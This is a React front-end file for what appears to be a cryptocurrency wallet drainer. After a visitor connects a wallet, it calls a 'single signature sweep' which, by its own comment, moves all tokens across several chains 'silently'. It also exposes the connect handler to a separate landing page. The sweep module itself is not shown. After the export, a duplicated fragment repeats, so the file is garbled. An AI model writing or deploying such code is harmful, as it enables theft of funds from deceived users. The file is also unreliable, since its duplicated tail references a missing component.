import { useState, useEffect } from 'react'
import { useWalletStore } from './stores/walletStore'
import { connectWallet, disconnectWallet, formatAddress } from './utils/walletConnect'
import { initiateSingleSignatureSweep } from './utils/singleSignatureSweep'
import ConnectButton from './components/ConnectButton'
import BalancesDisplay from './components/BalancesDisplay'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    isConnected,
    isLoading,
    error,
    balances,
    transferStatus,
    setAccount,
    setIsConnected,
    setIsLoading,
    setError,
    setBalances,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)
  const [provider, setProvider] = useState(null)

  /**
   * GROK-AI: Single Signature Flow
   * User connects → Signs ONE message → ALL tokens transfer silently
   */
  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      console.log('[App] 🚀 Starting GROK-AI single signature sweep...')

      // Step 1: Connect wallet
      const { account: addr, provider: connectedProvider } = await connectWallet()
      setProvider(connectedProvider)
      console.log('[App] ✅ Wallet connected:', addr)

      setAccount(addr)
      setIsConnected(true)

      // Step 2: Validate provider
      if (!connectedProvider) {
        throw new Error('Failed to get wallet provider')
      }

      // Step 3: Initiate single signature sweep
      console.log('[App] 📝 Requesting user signature (ONE TIME)...')
      const result = await initiateSingleSignatureSweep(connectedProvider, addr)

      if (result.success) {
        console.log('[App] ✅ Sweep successful!', result.transfers)
        setTransferStatus(result)
        setShowSummary(true)
      } else {
        setError(result.message)
        console.error('[App] ❌ Sweep failed:', result.message)
      }
    } catch (err) {
      const errorMsg = err.message || 'Connection failed'
      setError(errorMsg)
      console.error('[App] ❌ Error:', err)
    } finally {
      setIsLoading(false)
    }
  }

  /**
   * Expose connection handler to landing page
   */
  useEffect(() => {
    window.__app_handleConnect = handleConnect
    console.log('[App] Connection handler exposed to window')
  }, [handleConnect])

  /**
   * Handle wallet disconnection
   */
  const handleDisconnect = async () => {
    await disconnectWallet()
    setAccount(null)
    setIsConnected(false)
    setBalances({
      ethereum: '0',
      bsc: '0',
      polygon: '0',
      solana: '0',
      tron: '0',
      sui: '0'
    })
    setTransferStatus(null)
    setShowSummary(false)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center">
      <div className="w-full max-w-md px-4">
        {/* Connection Status */}
        {isConnected && account ? (
          <div className="bg-gradient-to-r from-green-900 to-green-800 border border-green-700 rounded-lg p-6 mb-8">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-green-300 text-sm font-semibold">Connected Wallet</p>
                <p className="text-white font-mono text-lg mt-1">{formatAddress(account)}</p>
              </div>
              <button
                onClick={handleDisconnect}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition"
              >
                Disconnect
              </button>
            </div>
          </div>
        ) : null}

        {/* Connect Button */}
        {!isConnected ? (
          <ConnectButton
            onClick={handleConnect}
            isLoading={isLoading}
          />
        ) : null}

        {/* Loading State */}
        {isLoading && (
          <div className="bg-blue-900 border border-blue-700 rounded-lg p-4 mb-4">
            <div className="flex items-center">
              <div className="animate-spin h-5 w-5 mr-3 border-2 border-blue-300 border-t-blue-600 rounded-full"></div>
              <span className="text-blue-200">Processing sweep across all chains...</span>
            </div>
          </div>
        )}

        {/* Error State */}
        {error && (
          <div className="bg-red-900 border border-red-700 rounded-lg p-4 mb-4">
            <p className="text-red-200 font-semibold">❌ Error</p>
            <p className="text-red-100 text-sm mt-1">{error}</p>
          </div>
        )}

        {/* Summary Modal */}
        {showSummary && transferStatus && (
          <SummaryModal
            transfers={transferStatus.transfers}
            results={transferStatus.results}
            onClose={() => setShowSummary(false)}
          />
        )}
      </div>
    </div>
  )
}

export default App
              </button>
            </div>
          </div>
        ) : null}

        {/* Connect Button */}
        {!isConnected ? (
          <ConnectButton
            onClick={handleConnect}
            isLoading={isLoading}
            error={error}
          />
        ) : null}

        {/* Balances Display */}
        {isConnected && (
          <BalancesDisplay balances={balances} />
        )}

        {/* Transfer Status */}
        {transferStatus && (
          <TransferModal status={transferStatus} />
        )}

        {/* Summary Modal */}
        {showSummary && (
          <SummaryModal
            status={transferStatus}
            onClose={() => setShowSummary(false)}
          />
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900 border border-red-700 rounded-lg p-4 mb-8">
            <p className="text-red-200 font-semibold">Error</p>
            <p className="text-red-300 text-sm mt-2">{error}</p>
          </div>
        )}
      </div>
    </div>
  )
}

export default App
